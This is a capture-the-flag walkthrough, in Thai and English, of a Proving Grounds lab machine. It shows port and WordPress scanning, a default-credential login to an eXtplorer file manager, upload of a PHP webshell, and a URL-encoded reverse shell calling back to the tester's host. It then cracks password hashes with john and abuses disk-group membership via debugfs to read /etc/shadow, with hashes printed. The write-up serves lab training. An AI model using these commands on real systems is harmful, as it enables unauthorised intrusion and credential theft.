# Recon 
## TCP Scan 

```bash
sudo ../Tools/scan.sh  192.168.172.16
[*] Running rustscan...
[*] Running nmap on ports: 22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 15:32 +07
Nmap scan report for 192.168.172.16
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.22 seconds
```
## TCP 80 
![[Challenge/ProvingGround/Extplorer/IMG/001.png]]

```bash
wpscan --url http://192.168.172.16/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.172.16/ [192.168.172.16]
[+] Effective URL: http://192.168.172.16/wp-admin/setup-config.php
[+] Started: Fri Jun 27 15:37:18 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://192.168.172.16/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.2 identified (Insecure, released on 2023-03-29).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://192.168.172.16/wp-includes/css/dashicons.min.css?ver=6.2
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://192.168.172.16/wp-includes/css/buttons.min.css?ver=6.2
 |  Style Etag (Aggressive Detection)
 |   - http://192.168.172.16/wp-admin/load-styles.php, Match: '6.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jun 27 15:38:22 2025
[+] Requests Done: 188
[+] Cached Requests: 2
[+] Data Sent: 39.063 KB
[+] Data Received: 22.178 MB
[+] Memory used: 243.902 MB
[+] Elapsed time: 00:01:04

```


# Dir Bruteforce 

เบื้องต้นจะหากเรา Bruteforce จะมี Wordpress และ /filemanager 

![[Challenge/ProvingGround/Extplorer/IMG/002.png]]

## /filemanager 

![[Challenge/ProvingGround/Extplorer/IMG/003.png]]
ทดสอบใช้ admin:admin 

![[Challenge/ProvingGround/Extplorer/IMG/004.png]]

# Exploit via webshell 

ทดสอบ Upload Shell 
```bash
cp /usr/share/webshells/php/simple-backdoor.php .
mv simple-backdoor.php shell.php
```

![[Challenge/ProvingGround/Extplorer/IMG/005.png]]

ทดสอบ `http://192.168.245.16/shell.php?cmd=ls` เราจะสามารถ Shell ไปที่เป้าหมายได้ 

![[Challenge/ProvingGround/Extplorer/IMG/006.png]]
# Shell as www-data

```http
http://192.168.245.16/shell.php?cmd=mkfifo%20%2Ftmp%2Fs%3B%20sh%20-i%20%3C%20%2Ftmp%2Fs%202%3E%261%20|%20openssl%20s_client%20-quiet%20-connect%20192.168.45.152%3A443%20%3E%20%2Ftmp%2Fs%3B%20rm%20%2Ftmp%2Fs
```

```bash
sudo openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes;sudo openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

![[Challenge/ProvingGround/Extplorer/IMG/007.png]]

# Filemanager config enum

```bash
www-data@dora:/var/www/html/filemanager/config$ pwd 
pwd 
/var/www/html/filemanager/config
www-data@dora:/var/www/html/filemanager/config$ ls 
ls 
bookmarks_extplorer_admin.php  conf.php  index.html  mimes.php
www-data@dora:/var/www/html/filemanager/config$ ls -la 
ls -la 
total 36
drwxr-xr-x  2 www-data www-data 4096 Apr  6  2023 .
drwxr-xr-x 11 www-data www-data 4096 Apr  6  2023 ..
-rw-r--r--  1 www-data www-data   15 Feb 23  2016 .htaccess
-rw-r--r--  1 www-data www-data  413 Apr  6  2023 .htusers.php
-rw-rw-r--  1 www-data www-data   99 Apr  6  2023 bookmarks_extplorer_admin.php
-rw-r--r--  1 www-data www-data 3007 Jan  6  2022 conf.php
-rw-r--r--  1 www-data www-data   44 Feb 23  2016 index.html
-rw-r--r--  1 www-data www-data 7871 Jan  6  2022 mimes.php
www-data@dora:/var/www/html/filemanager/config$ cat .htusers.php
cat .htusers.php
<?php 
        // ensure this file is being included by a parent file
        if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
        $GLOBALS["users"]=array(
        array('admin','21232f297a57a5a743894a0e4a801fc3','/var/www/html','http://localhost','1','','7',1),
        array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),
); 
?>www-data@dora:/var/www/html/filemanager/config$ 

```

ข้อมูลข้างต้นจะเห็นว่ามีข้อมูลของ admin และ dora ซึ่งมีค่า Hash อยู่ ทั้งนี้ลองทดสอบ Crack hash ดังกล่าว 
```bash
──(kali㉿kali)-[~/Desktop]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
doraemon         (?)     
1g 0:00:00:01 DONE (2025-06-29 23:02) 0.5208g/s 787.5p/s 787.5c/s 787.5C/s gonzalez..something
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

# Shell as dora 

ข้างต้นจะได้ข้อมูลรหัสผ่านของ dora:doraemon ด้วย `su dora`


# Disk group privilege escalation 

Ref: [link](https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989---------------------------------------) 

ปัญหาหลักคือกลุ่ม 'disk' มีสิทธิ์ในการอ่านและเขียนข้อมูลทั้งหมดบนอุปกรณ์บล็อกในไดเรกทอรี `/dev/` ซึ่งรวมถึงระบบไฟล์หลักของเครื่อง เช่น `/dev/sda1`
วิธีที่ผู้โจมตีใช้คือการใช้เครื่องมือ `debugfs` เพื่ออ่านข้อมูลจากดิสก์ทั้งหมดด้วยสิทธิ์ระดับ root แม้ว่าจะไม่สามารถเขียนข้อมูลลงไปได้โดยตรง แต่ก็สามารถอ่านไฟล์สำคัญๆ เช่น private key ของ SSH (เช่น `id_rsa`) จากไดเรกทอรี root ได้ เมื่อได้ไฟล์เหล่านี้มา ผู้โจมตีก็สามารถคัดลอกไฟล์ ปรับสิทธิ์ให้ถูกต้อง แล้วใช้มันเพื่อเข้าสู่ระบบเซิร์ฟเวอร์ในฐานะ root ได้

วิธีป้องกันคือ **ไม่ควรให้ผู้ใช้เป็นสมาชิกของกลุ่ม 'disk'**
## Identify vulnerability 
```bash
id
```

![[Challenge/ProvingGround/Extplorer/IMG/010.png]]

เราจะพบว่าผู้ใช้งาน dora อยู่กลุ่มเดียวกันกับ disk โดยตรวสอบจากกลุ่มของ /dev ที่อยู่ในกลุ่มของ disk โดยตรวจสอบโดยใช้คำสั่ง `find /dev -group disk` และจากนั้นลองใช้ `df -h` เพื่อตรวจสอบว่ามีการใช้งานหรือไม่ 

```bash
dora@dora:~$find /dev -group disk

/dev/btrfs-control
/dev/dm-0
/dev/sda3
/dev/sda2
/dev/sda1
/dev/sda
/dev/sg1
/dev/loop7
/dev/loop6
/dev/loop5
/dev/loop4
/dev/loop3
/dev/loop2
/dev/loop1
/dev/loop0
/dev/loop-control


dora@dora:~$ df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.2M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop4                          68M   68M     0 100% /snap/lxd/22753
/dev/loop2                          50M   50M     0 100% /snap/snapd/18596
/dev/loop3                          92M   92M     0 100% /snap/lxd/24061
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  209M  1.4G  13% /boot
tmpfs                              199M     0  199M   0% /run/user/1000

```

จากข้อมูลข้างต้นจะเห้นว่ามี /dev หลายชุดที่อยู่ภายใต้กลุ่ม disk ที่สามารถจัดการได้

## Exploit Disk group 

```bash
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
cd /root
cat proof.txt 
cat /etc/shadow 
```

หากตรวจสอบจะพบว่ามี password ของ root เป็นค่าดังต่อไปนี้ 
```bash
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
```

![[Challenge/ProvingGround/Extplorer/IMG/011.png]]
# PWN